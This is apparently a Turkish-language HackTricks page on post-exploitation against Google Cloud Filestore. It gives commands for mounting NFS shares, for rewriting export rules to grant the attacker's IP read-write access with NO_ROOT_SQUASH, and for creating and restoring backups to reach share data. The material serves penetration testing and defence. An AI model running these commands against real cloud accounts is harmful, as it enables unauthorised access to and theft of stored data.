# GCP - Filestore Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Filestore

Filestore hakkında daha fazla bilgi için kontrol edin:

{{#ref}}
../gcp-services/gcp-filestore-enum.md
{{#endref}}

### Filestore'u Bağla

Paylaşılan bir dosya sistemi **saldırganlar açısından ilginç hassas bilgileri içerebilir**. Filestore'a erişim ile **onu bağlamak** mümkündür:
```bash
sudo apt-get update
sudo apt-get install nfs-common
# Check the share name
showmount -e <IP>
# Mount the share
mkdir /mnt/fs
sudo mount [FILESTORE_IP]:/[FILE_SHARE_NAME] /mnt/fs
```
Filestore örneğinin IP adresini bulmak için sayfanın numaralandırma bölümünü kontrol edin:

{{#ref}}
../gcp-services/gcp-filestore-enum.md
{{#endref}}

### Kısıtlamaları Kaldırın ve Ek İzinler Alın

Eğer saldırgan paylaşıma erişimi olan bir IP adresinde değilse, ancak bunu değiştirmek için yeterli izniniz varsa, kısıtlamaları kaldırmak veya buna erişim sağlamak mümkündür. Ayrıca, paylaşıma yönetici erişimi sağlamak için IP adresinize daha fazla ayrıcalık vermek de mümkündür:
```bash
gcloud filestore instances update nfstest \
--zone=<exact-zone> \
--flags-file=nfs.json

# Contents of nfs.json
{
"--file-share":
{
"capacity": "1024",
"name": "<share-name>",
"nfs-export-options": [
{
"access-mode": "READ_WRITE",
"ip-ranges": [
"<your-ip-private-address>/32"
],
"squash-mode": "NO_ROOT_SQUASH",
"anon_uid": 1003,
"anon_gid": 1003
}
]
}
}
```
### Yedekleme Geri Yükleme

Eğer bir yedekleme varsa, mevcut veya yeni bir örnekte **geri yüklemek** mümkündür, böylece **bilgileri erişilebilir hale gelir:**
```bash
# Create a new filestore if you don't want to modify the old one
gcloud filestore instances create <new-instance-name> \
--zone=<zone> \
--tier=STANDARD \
--file-share=name=vol1,capacity=1TB \
--network=name=default,reserved-ip-range=10.0.0.0/29

# Restore a backups in a new instance
gcloud filestore instances restore <new-instance-name> \
--zone=<zone> \
--file-share=<instance-file-share-name> \
--source-backup=<backup-name> \
--source-backup-region=<backup-region>

# Follow the previous section commands to mount it
```
### Yedek oluşturun ve geri yükleyin

Eğer **bir paylaşıma erişiminiz yoksa ve onu değiştirmek istemiyorsanız**, onun **yedekini oluşturmak** ve daha önce bahsedildiği gibi **geri yüklemek** mümkündür:
```bash
# Create share backup
gcloud filestore backups create <back-name> \
--region=<region> \
--instance=<instance-name> \
--instance-zone=<instance-zone> \
--file-share=<share-name>

# Follow the previous section commands to restore it and mount it
```
{{#include ../../../banners/hacktricks-training.md}}
